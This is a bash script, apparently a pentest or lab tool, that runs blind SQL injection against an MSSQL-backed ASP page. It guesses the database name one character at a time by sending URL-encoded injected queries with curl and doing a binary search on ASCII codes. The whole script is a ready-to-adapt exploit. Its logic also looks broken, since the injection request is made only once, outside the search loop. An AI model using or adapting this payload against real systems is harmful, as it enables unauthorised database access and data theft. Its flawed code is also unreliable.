#!/bin/bash
# Working script that was quickly written to infer the database name of a MSSQL database via blind SQL injection. Basically we're asking the database if the ASCII code of the Nth character is higher or lower than value i and we continue to eliminate half of the possibilities every iteration for every Nth character to end up with the database name.
################## Variables
i=110 # ASCII code for N character halfway the alphabet where we start asking the db if the ASCII code is higher/lower
x=40 # range, set at 40 because it's easier to divide than 26
c=1 # starting character, don't change
maxc=9 # expected length of the database name (you may need to increase this)
a=`curl -v --silent "http://172.16.15.6/showproduct2.asp?id=2%20AND%20ISNULL%28ASCII%28SUBSTRING%28CAST%28%28SELECT%20LOWER%28db_name%280%29%29%29AS%20varchar%288000%29%29,$c,1%29%29,0%29%3E$i" 2>&1 | grep ecords | grep -o "[0-9]"` # the blind SQL injection url including the parameters and a pipe into grep which returns 1 if the statement is true (TODO Change this line to fit your scenario)

#Writing header to output to separate different attempts
echo "----"  >> result.txt

# main function
runfunction () {
if [ $c -gt $maxc ] # quit after hitting the max length
then
cat result.txt
	exit
fi

if [ $x -lt 1 ] # possibilities exhausted, correct ASCII value found
then
echo "result " `echo $i | awk '{ printf("%c",$0); }'`  >> result.txt
	c=$((c+1)) # next character and afterwards resetting i and x values
i=110
x=40
runfunction # start on next character
fi

# first 1 from 1,1 is character position
echo "$a"
echo "running " $c
if [ "$a" -eq 1 ] # May need to change this line and $a, this was a very specific grep query to only return 1 if true and 0 if false
# if true the value of c is higher
then
	echo "ASCII" $i "is still 1"
	echo $x "x is "
	x=$(((x/2)+1)) # dividing the range by 2
	i=$((i+x)) 
runfunction
else
# the value of c is lower
	echo "ASCII" $i "is 0"
	echo $x "x is "
	x=$((x/2)) # dividing the range by 2
	i=$((i-x))  
runfunction
fi
}
runfunction
